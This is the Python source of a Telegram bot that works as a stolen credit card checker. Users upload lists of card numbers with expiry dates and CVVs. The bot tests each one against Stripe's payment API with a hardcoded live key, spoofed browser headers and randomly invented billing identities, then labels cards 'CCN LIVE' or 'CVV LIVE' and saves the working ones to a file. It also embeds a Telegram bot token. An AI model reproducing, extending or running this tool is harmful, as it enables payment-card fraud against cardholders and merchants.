import os
import json
import time
import requests
import threading
import random
import re
from datetime import datetime
import telebot
from telebot import types
import logging

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Bot token
TOKEN = os.environ.get("BOT_TOKEN", "8307343077:AAGG7qRYwcN2fJ2Wig3kMpsT7605YEb-pgU")

# Initialize bot
bot = telebot.TeleBot(TOKEN, parse_mode="HTML")

# Store user states and data
user_sessions = {}
active_checkers = {}

class CardChecker:
    def __init__(self, user_id):
        self.user_id = user_id
        self.running = False
        self.current_card = None
        self.approved_cards = []
        self.total_checked = 0
        self.approved_count = 0
        self.start_time = None
        
    def check_card(self, ccx):
        """Check a single card - FIXED with your publishable key"""
        if "|" not in ccx or ccx.count("|") < 3:
            return f"❌ Invalid format: {ccx}"
        
        parts = ccx.split("|")
        if len(parts) < 4:
            return f"❌ Invalid format: {ccx}"
            
        n = parts[0].strip()
        mm = parts[1].strip()
        yy = parts[2].strip()
        cvc = parts[3].strip()
        
        # First, validate card format
        if not self._validate_card_format(n, mm, yy, cvc):
            return f"💳 {ccx} ➜ ❌ INVALID FORMAT\n📝 Card format is invalid"
        
        # Use your publishable key
        STRIPE_PK = "pk_live_ftYOjqGtfMkXICnngj1VQh99"
        
        # Try multiple checking methods
        results = []
        methods = [
            lambda: self._check_stripe_simple(n, mm, yy, cvc, STRIPE_PK),
            lambda: self._check_stripe_with_billing(n, mm, yy, cvc, STRIPE_PK),
            lambda: self._check_basic_validation(n, mm, yy, cvc)
        ]
        
        for method in methods:
            try:
                result = method()
                if result:
                    # If we get a clear live result, return it
                    if "✅" in result:
                        return result
                    results.append(result)
            except Exception as e:
                logger.error(f"Method error: {e}")
                continue
        
        # Return the best result
        if results:
            # Prefer "FORMAT VALID" over errors
            for result in results:
                if "FORMAT VALID" in result:
                    return result
            return results[0]
        
        return f"💳 {ccx} ➜ ❌ DECLINED\n📝 All check methods failed"
    
    def _validate_card_format(self, n, mm, yy, cvc):
        """Basic card format validation"""
        # Check card number length
        if len(n) < 13 or len(n) > 19:
            return False
        
        # Check if all digits
        if not n.isdigit():
            return False
        
        # Check month (1-12)
        try:
            month = int(mm)
            if month < 1 or month > 12:
                return False
        except:
            return False
        
        # Check year (2 or 4 digits)
        if len(yy) not in [2, 4]:
            return False
        
        # Check CVV (3-4 digits)
        if len(cvc) < 3 or len(cvc) > 4:
            return False
        if not cvc.isdigit():
            return False
        
        return True
    
    def _check_stripe_simple(self, n, mm, yy, cvc, stripe_pk):
        """Simple Stripe check with your key"""
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        }
        
        # Generate fresh IDs
        guid = f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}"
        muid = f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}"
        
        # Simple data with your key
        data = {
            'type': 'card',
            'card[number]': n,
            'card[cvc]': cvc,
            'card[exp_month]': mm,
            'card[exp_year]': yy,
            'guid': guid,
            'muid': muid,
            'payment_user_agent': 'stripe.js/1.0',
            'referrer': 'https://example.com',
            'time_on_page': str(random.randint(10000, 99999)),
            'key': stripe_pk  # YOUR KEY HERE
        }
        
        try:
            response = requests.post(
                'https://api.stripe.com/v1/payment_methods',
                headers=headers,
                data=data,
                timeout=10
            )
            
            resp_json = response.json()
            
            if 'id' in resp_json:
                return f"💳 {n}|{mm}|{yy}|{cvc} ➜ ✅ STRIPE ACCEPTED\n📝 Payment method created"
            else:
                error = resp_json.get('error', {}).get('message', 'Unknown error')
                # Interpret the error
                error_lower = error.lower()
                
                if any(word in error_lower for word in ['cvv', 'security code', 'incorrect code']):
                    return f"💳 {n}|{mm}|{yy}|{cvc} ➜ ✅ CCN LIVE\n📝 {error}"
                
                elif 'insufficient' in error_lower or 'funds' in error_lower:
                    return f"💳 {n}|{mm}|{yy}|{cvc} ➜ ✅ CVV LIVE\n📝 {error}"
                
                elif any(word in error_lower for word in ['avs', 'address', 'zip', 'postal']):
                    return f"💳 {n}|{mm}|{yy}|{cvc} ➜ ✅ AVS LIVE\n📝 {error}"
                
                elif any(word in error_lower for word in ['3d', 'authentication', 'secure']):
                    return f"💳 {n}|{mm}|{yy}|{cvc} ➜ ✅ 3D SECURE\n📝 {error}"
                
                else:
                    return f"💳 {n}|{mm}|{yy}|{cvc} ➜ ❌ DECLINED\n📝 {error[:100]}"
                
        except Exception as e:
            logger.error(f"Stripe simple error: {e}")
            return None
    
    def _check_stripe_with_billing(self, n, mm, yy, cvc, stripe_pk):
        """Stripe check with billing details"""
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        }
        
        # Random billing details
        first_names = ['John', 'Jane', 'Robert', 'Maria', 'David', 'Sarah']
        last_names = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones']
        cities = ['New York', 'Los Angeles', 'Chicago', 'Houston', 'Phoenix']
        states = ['NY', 'CA', 'IL', 'TX', 'AZ']
        
        fname = random.choice(first_names)
        lname = random.choice(last_names)
        city = random.choice(cities)
        state = random.choice(states)
        zip_code = f"{random.randint(10000, 99999)}"
        email = f"test{random.randint(1000, 9999)}@example.com"
        
        data = {
            'type': 'card',
            'billing_details[address][city]': city,
            'billing_details[address][country]': 'US',
            'billing_details[address][line1]': f'{random.randint(100, 9999)} Main St',
            'billing_details[address][postal_code]': zip_code,
            'billing_details[address][state]': state,
            'billing_details[email]': email,
            'billing_details[name]': f'{fname} {lname}',
            'card[number]': n,
            'card[cvc]': cvc,
            'card[exp_month]': mm,
            'card[exp_year]': yy,
            'guid': f'{random.randint(10000000, 99999999)}',
            'muid': f'{random.randint(10000000, 99999999)}',
            'payment_user_agent': 'stripe.js/1.0',
            'key': stripe_pk  # YOUR KEY HERE
        }
        
        try:
            response = requests.post(
                'https://api.stripe.com/v1/payment_methods',
                headers=headers,
                data=data,
                timeout=10
            )
            
            resp_json = response.json()
            
            if 'id' in resp_json:
                return f"💳 {n}|{mm}|{yy}|{cvc} ➜ ✅ STRIPE ACCEPTED\n📝 With billing details"
            else:
                error = resp_json.get('error', {}).get('message', 'Unknown error')
                error_lower = error.lower()
                
                # Check for live card indicators
                if any(word in error_lower for word in ['cvv', 'security code', 'incorrect code']):
                    return f"💳 {n}|{mm}|{yy}|{cvc} ➜ ✅ CCN LIVE\n📝 {error}"
                elif 'insufficient' in error_lower or 'funds' in error_lower:
                    return f"💳 {n}|{mm}|{yy}|{cvc} ➜ ✅ CVV LIVE\n📝 {error}"
                elif any(word in error_lower for word in ['avs', 'address', 'zip']):
                    return f"💳 {n}|{mm}|{yy}|{cvc} ➜ ✅ AVS LIVE\n📝 {error}"
                elif any(word in error_lower for word in ['3d', 'authentication']):
                    return f"💳 {n}|{mm}|{yy}|{cvc} ➜ ✅ 3D SECURE\n📝 {error}"
                else:
                    return f"💳 {n}|{mm}|{yy}|{cvc} ➜ ❌ DECLINED\n📝 {error[:100]}"
                
        except Exception as e:
            logger.error(f"Stripe billing error: {e}")
            return None
    
    def _check_basic_validation(self, n, mm, yy, cvc):
        """Basic validation without API call"""
        # Check expiration
        current_year = datetime.now().year % 100
        current_month = datetime.now().month
        
        try:
            card_year = int(yy) if len(yy) == 2 else int(yy) % 100
            card_month = int(mm)
            
            if card_year < current_year or (card_year == current_year and card_month < current_month):
                return f"💳 {n}|{mm}|{yy}|{cvc} ➜ ❌ EXPIRED\n📝 Card expired {mm}/{yy}"
        except:
            pass
        
        # Luhn algorithm check
        if not self._luhn_check(n):
            return f"💳 {n}|{mm}|{yy}|{cvc} ➜ ❌ INVALID NUMBER\n📝 Card number failed validation"
        
        # BIN check (first 6 digits)
        bin_number = n[:6]
        common_bins = {
            '4': 'Visa',
            '5': 'Mastercard',
            '34': 'Amex',
            '37': 'Amex',
            '60': 'Discover',
            '30': 'Diners',
            '35': 'JCB'
        }
        
        card_type = "Unknown"
        for prefix, ctype in common_bins.items():
            if n.startswith(prefix):
                card_type = ctype
                break
        
        return f"💳 {n}|{mm}|{yy}|{cvc} ➜ ⚡ FORMAT VALID\n📝 {card_type} • BIN: {bin_number}"
    
    def _luhn_check(self, card_number):
        """Luhn algorithm for card number validation"""
        def digits_of(n):
            return [int(d) for d in str(n)]
        
        digits = digits_of(card_number)
        odd_digits = digits[-1::-2]
        even_digits = digits[-2::-2]
        checksum = sum(odd_digits)
        for d in even_digits:
            checksum += sum(digits_of(d * 2))
        return checksum % 10 == 0
    
    def start_checking(self, cards):
        """Start checking cards with NO DELAY"""
        self.running = True
        self.start_time = datetime.now()
        self.total_checked = 0
        self.approved_count = 0
        self.approved_cards = []
        
        def checking_thread():
            try:
                status_message = None
                
                # Send initial status
                status_message = bot.send_message(
                    self.user_id,
                    "🔄 Starting card checker...\n⚡ No delay between cards\n🔑 Using: pk_live_ftYOjqGtfMkXICnngj1VQh99"
                )
                
                approved_file = f"approved_{self.user_id}_{int(time.time())}.txt"
                
                for i, card in enumerate(cards):
                    if not self.running:
                        break
                        
                    self.current_card = card
                    self.total_checked += 1
                    
                    # Update status every 10 cards
                    if self.total_checked % 10 == 0 or self.total_checked == 1:
                        elapsed = datetime.now() - self.start_time
                        cards_per_second = self.total_checked / max(elapsed.seconds, 1)
                        status_text = (
                            f"📊 <b>Checker Status</b>\n"
                            f"✅ Live: {self.approved_count}\n"
                            f"📋 Total: {self.total_checked}\n"
                            f"⏰ Time: {elapsed.seconds // 60}m {elapsed.seconds % 60}s\n"
                            f"⚡ Speed: {cards_per_second:.1f} cards/sec\n"
                            f"🔄 Checking: {card[:15]}..."
                        )
                        try:
                            bot.edit_message_text(
                                status_text,
                                chat_id=self.user_id,
                                message_id=status_message.message_id
                            )
                        except:
                            status_message = bot.send_message(
                                self.user_id,
                                status_text
                            )
                    
                    result = self.check_card(card)
                    
                    # Send result
                    bot.send_message(self.user_id, result)
                    
                    # Check if approved (contains ✅)
                    if "✅" in result:
                        self.approved_count += 1
                        self.approved_cards.append(f"{card} | {result}")
                        
                        # Save to file
                        with open(approved_file, 'a', encoding='utf-8') as f:
                            f.write(f"{card} | {result}\n")
                
                # Final results
                elapsed = datetime.now() - self.start_time
                cards_per_second = self.total_checked / max(elapsed.seconds, 1)
                final_message = (
                    f"🏁 <b>Checker Completed!</b>\n\n"
                    f"📊 <b>Results:</b>\n"
                    f"✅ Live/Approved: {self.approved_count}\n"
                    f"❌ Dead/Invalid: {self.total_checked - self.approved_count}\n"
                    f"📋 Total Checked: {self.total_checked}\n"
                    f"⏰ Time: {elapsed.seconds // 60}m {elapsed.seconds % 60}s\n"
                    f"⚡ Speed: {cards_per_second:.1f} cards/sec\n\n"
                )
                
                if self.approved_cards:
                    final_message += f"📁 Approved cards saved to: <code>{approved_file}</code>\n"
                
                bot.send_message(self.user_id, final_message)
                
            except Exception as e:
                bot.send_message(self.user_id, f"❌ Thread error: {str(e)}")
            finally:
                self.running = False
        
        thread = threading.Thread(target=checking_thread)
        thread.daemon = True
        thread.start()
        
    def stop(self):
        """Stop the checker"""
        self.running = False

# Telegram bot handlers
@bot.message_handler(commands=['start'])
def start_command(message):
    welcome_text = f"""
👋 Welcome {message.from_user.first_name} to Card Checker Bot!

🤖 <b>Available Commands:</b>
/start - Show this message
/help - Show instructions
/check - Check single card (format: card|mm|yy|cvv)
/check_file - Upload file with multiple cards
/status - Show current checker status
/stop - Stop current checking process
/stats - Show your checking statistics

📝 <b>Card Format:</b>
<code>card_number|mm|yy|cvv</code>

⚡ <b>Speed:</b> No delay between cards
🔑 <b>Using:</b> pk_live_ftYOjqGtfMkXICnngj1VQh99

⚠️ <b>Note:</b> Use responsibly.
    """
    bot.reply_to(message, welcome_text)

@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = """
🆘 <b>Help Guide</b>

<b>How to use:</b>
1. Send single card: /check 1234567890123456|12|34|567
2. Upload file: /check_file and upload .txt file

<b>Commands:</b>
• /check [card] - Check single card
• /check_file - Upload file with cards
• /status - Current checker status
• /stop - Stop checking
• /stats - Your statistics

<b>Output Meaning:</b>
✅ STRIPE ACCEPTED - Card accepted by Stripe
✅ CCN LIVE - Security code incorrect
✅ CVV LIVE - Insufficient funds
✅ AVS LIVE - Address verification failed
✅ 3D SECURE - Authentication required

❌ DECLINED - Card declined
❌ EXPIRED - Card expired
❌ INVALID FORMAT - Wrong format
❌ INVALID NUMBER - Invalid card number

⚡ FORMAT VALID - Card format is valid

🔑 <b>Using key:</b> pk_live_ftYOjqGtfMkXICnngj1VQh99
    """
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['check'])
def check_card_command(message):
    user_id = message.from_user.id
    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
    
    if not args:
        bot.reply_to(message, "❌ Format: /check card|mm|yy|cvv")
        return
    
    card = ' '.join(args).strip()
    bot.reply_to(message, f"🔄 Checking: <code>{card[:15]}...</code>\n🔑 Using your publishable key...")
    
    checker = CardChecker(user_id)
    result = checker.check_card(card)
    bot.send_message(user_id, result)

@bot.message_handler(commands=['check_file'])
def check_file_command(message):
    user_id = message.from_user.id
    
    if user_id in active_checkers and active_checkers[user_id].running:
        bot.reply_to(message, "⚠️ Already running! Use /stop first.")
        return
    
    bot.reply_to(message, "📤 Upload .txt file with cards (one per line)\n🔑 Using: pk_live_ftYOjqGtfMkXICnngj1VQh99")
    user_sessions[user_id] = 'waiting_for_file'

@bot.message_handler(content_types=['document'])
def handle_document(message):
    user_id = message.from_user.id
    
    if user_id not in user_sessions or user_sessions[user_id] != 'waiting_for_file':
        return
    
    document = message.document
    
    if not document.file_name.endswith('.txt'):
        bot.reply_to(message, "❌ Need .txt file!")
        del user_sessions[user_id]
        return
    
    bot.reply_to(message, "📥 Downloading file...")
    
    try:
        file_info = bot.get_file(document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        file_path = f"cards_{user_id}.txt"
        
        with open(file_path, 'wb') as f:
            f.write(downloaded_file)
        
        with open(file_path, 'r', encoding='utf-8') as f:
            cards = [line.strip() for line in f if line.strip()]
        
        if not cards:
            bot.reply_to(message, "❌ File empty!")
            del user_sessions[user_id]
            os.remove(file_path)
            return
        
        bot.reply_to(message, f"📋 Found {len(cards)} cards\n🔄 Starting checker...\n🔑 Using your key")
        
        checker = CardChecker(user_id)
        active_checkers[user_id] = checker
        checker.start_checking(cards)
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")
    finally:
        del user_sessions[user_id]
        if os.path.exists(file_path):
            os.remove(file_path)

@bot.message_handler(commands=['status'])
def status_command(message):
    user_id = message.from_user.id
    
    if user_id not in active_checkers:
        bot.reply_to(message, "ℹ️ No checker running")
        return
    
    checker = active_checkers[user_id]
    if not checker.running:
        bot.reply_to(message, "ℹ️ Checker not running")
        return
    
    elapsed = datetime.now() - checker.start_time
    cards_per_second = checker.total_checked / max(elapsed.seconds, 1)
    status_text = (
        f"📊 <b>Checker Status</b>\n\n"
        f"✅ Live: {checker.approved_count}\n"
        f"📋 Checked: {checker.total_checked}\n"
        f"⏰ Time: {elapsed.seconds // 60}m {elapsed.seconds % 60}s\n"
        f"⚡ Speed: {cards_per_second:.1f} cards/sec\n"
        f"🔑 Using: pk_live_ftYOjqGtfMkXICnngj1VQh99\n"
    )
    if checker.current_card:
        status_text += f"\n🔄 Now: <code>{checker.current_card[:15]}...</code>"
    
    bot.reply_to(message, status_text)

@bot.message_handler(commands=['stop'])
def stop_command(message):
    user_id = message.from_user.id
    
    if user_id not in active_checkers:
        bot.reply_to(message, "ℹ️ No checker to stop")
        return
    
    checker = active_checkers[user_id]
    if checker.running:
        checker.stop()
        bot.reply_to(message, f"🛑 Stopped!\n✅ Live: {checker.approved_count}\n📋 Total: {checker.total_checked}")
        del active_checkers[user_id]
    else:
        bot.reply_to(message, "ℹ️ Checker not running")

@bot.message_handler(commands=['stats'])
def stats_command(message):
    user_id = message.from_user.id
    
    if user_id not in active_checkers:
        bot.reply_to(message, "📊 No stats yet\nUse /check or /check_file")
        return
    
    checker = active_checkers[user_id]
    success_rate = (checker.approved_count / max(checker.total_checked, 1)) * 100
    
    stats_text = (
        f"📊 <b>Your Statistics</b>\n\n"
        f"✅ Total Live: {checker.approved_count}\n"
        f"📋 Total Checked: {checker.total_checked}\n"
        f"📈 Success Rate: {success_rate:.1f}%\n"
        f"⚡ Speed: No delay between cards\n"
        f"🔑 Key: pk_live_ftYOjqGtfMkXICnngj1VQh99\n"
    )
    
    bot.reply_to(message, stats_text)

def main():
    """Main function to start the bot"""
    logger.info("🤖 Bot is starting...")
    logger.info("🔑 Using publishable key: pk_live_ftYOjqGtfMkXICnngj1VQh99")
    
    try:
        # Get bot info
        bot_info = bot.get_me()
        logger.info(f"✅ Bot connected: @{bot_info.username}")
        
        # Start polling with skip_pending to avoid conflicts
        bot.infinity_polling(skip_pending=True, timeout=30, long_polling_timeout=30)
        
    except Exception as e:
        logger.error(f"❌ Error starting bot: {e}")

if __name__ == '__main__':
    main()
